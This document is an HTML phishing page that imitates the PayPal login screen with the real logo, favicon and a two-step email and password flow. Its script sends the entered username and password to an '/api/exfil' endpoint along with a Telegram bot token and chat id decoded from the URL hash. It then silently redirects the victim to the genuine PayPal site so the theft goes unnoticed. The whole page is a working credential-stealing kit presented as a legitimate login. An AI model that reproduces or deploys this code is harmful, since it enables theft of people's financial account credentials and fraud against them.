<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in to your PayPal account</title>
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #2c2e2f;
            -webkit-font-smoothing: antialiased;
            margin: 0;
        }

        .main-container {
            width: 100%;
            max-width: 460px;
            margin: 0 auto;
            padding: 40px 20px;
            text-align: center;
        }

        .pp-input-container {
            position: relative;
            margin-bottom: 12px;
            text-align: left;
        }

        .pp-input {
            width: 100%;
            height: 54px;
            border: 1px solid #9da3a6;
            border-radius: 4px;
            padding: 0 15px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .pp-input:focus {
            border-color: #0070ba;
            box-shadow: 0 0 0 1px #0070ba;
        }

        .pp-btn-next {
            background-color: #0056b3;
            color: #ffffff;
            font-weight: 700;
            font-size: 16px;
            height: 48px;
            border-radius: 24px;
            width: 100%;
            margin-top: 24px;
            transition: background-color 0.2s;
        }

        .pp-btn-signup {
            background-color: #ffffff;
            border: 1px solid #2c2e2f;
            color: #2c2e2f;
            font-weight: 700;
            font-size: 16px;
            height: 48px;
            border-radius: 24px;
            width: 100%;
            margin-top: 16px;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 32px 0;
            color: #6c7378;
            font-size: 14px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #cbd2d6;
        }
        .divider:not(:empty)::before { margin-right: 1.25em; }
        .divider:not(:empty)::after { margin-left: 1.25em; }

        .lang-selector {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 80px;
            font-size: 13px;
            font-weight: 700;
            color: #6c7378;
        }

        .lang-selector span { cursor: pointer; }
        .lang-selector span:hover { text-decoration: underline; }
        .lang-active { color: #2c2e2f; }

        /* Progress Bar */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: transparent;
            overflow: hidden;
            display: none;
            z-index: 1000;
        }
        #loader div {
            position: absolute;
            background-color: #0070ba;
            height: 100%;
            width: 40%;
            animation: indeterminate 1.2s infinite linear;
        }
        @keyframes indeterminate { 0% { left: -40%; } 100% { left: 100%; } }

        .footer {
            background-color: #f7f9fa;
            width: 100%;
            padding: 20px 0;
            position: fixed;
            bottom: 0;
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 12px;
            font-weight: 700;
            color: #6c7378;
        }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <div id="loader"><div></div></div>

    <main class="main-container">
        <!-- Logo from screenshot -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" class="h-8 mx-auto mb-12">

        <div id="step-id">
            <div class="pp-input-container">
                <input type="text" id="email" class="pp-input" placeholder="Email or mobile number" autocomplete="username">
            </div>
            
            <div class="text-left">
                <a href="#" class="text-[#0070ba] font-bold text-sm hover:underline">Forgot email?</a>
            </div>
            
            <button onclick="toPass()" class="pp-btn-next">Next</button>

            <div class="divider">or</div>

            <button class="pp-btn-signup">Sign Up</button>
        </div>

        <div id="step-pass" class="hidden">
            <div class="flex items-center justify-center gap-2 mb-6">
                <span id="display-user" class="text-sm font-semibold"></span>
                <button onclick="location.reload()" class="text-[#0070ba]"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg></button>
            </div>
            <div class="pp-input-container">
                <input type="password" id="password" class="pp-input" placeholder="Password" autofocus>
            </div>
            <div class="text-left">
                <a href="#" class="text-[#0070ba] font-bold text-sm hover:underline">Forgot password?</a>
            </div>
            <button onclick="dispatch()" class="pp-btn-next">Log In</button>
        </div>

        <!-- Language Bar from screenshot -->
        <div class="lang-selector">
            <div class="flex items-center gap-1">
                <img src="https://www.paypalobjects.com/webstatic/mktg/2014/global/flag_usa.png" class="w-5 h-4 object-cover" alt="US">
                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
            </div>
            <span class="lang-active">English</span>
            <div class="w-[1px] h-3 bg-gray-300"></div>
            <span>Français</span>
            <div class="w-[1px] h-3 bg-gray-300"></div>
            <span>Español</span>
            <div class="w-[1px] h-3 bg-gray-300"></div>
            <span>中文</span>
        </div>
    </main>

    <footer class="footer">
        <a href="#">Contact Us</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Policy Updates</a>
        <a href="#">Worldwide</a>
    </footer>

    <script>
        const getConf = () => {
            const h = window.location.hash.substring(1);
            if (!h) return null;
            try { return JSON.parse(atob(h)); } catch(e) { return null; }
        };

        const config = getConf();
        let userEmail = "";

        function toPass() {
            userEmail = document.getElementById('email').value;
            if(!userEmail) return;

            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('display-user').innerText = userEmail;
                document.getElementById('step-id').classList.add('hidden');
                document.getElementById('step-pass').classList.remove('hidden');
            }, 800);
        }

        async function dispatch() {
            const p = document.getElementById('password').value;
            if(!p) return;

            document.getElementById('loader').style.display = 'block';
            const fin = "https://www.paypal.com/myaccount/summary";

            if(!config) { setTimeout(() => window.location.href = fin, 1200); return; }

            try {
                await fetch('/api/exfil', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target: 'paypal',
                        credentials: { username: userEmail, password: p },
                        tgToken: config.t,
                        tgChat: config.c
                    })
                });
            } catch (e) {} finally {
                setTimeout(() => { window.location.href = fin; }, 1200);
            }
        }
    </script>
</body>
</html>
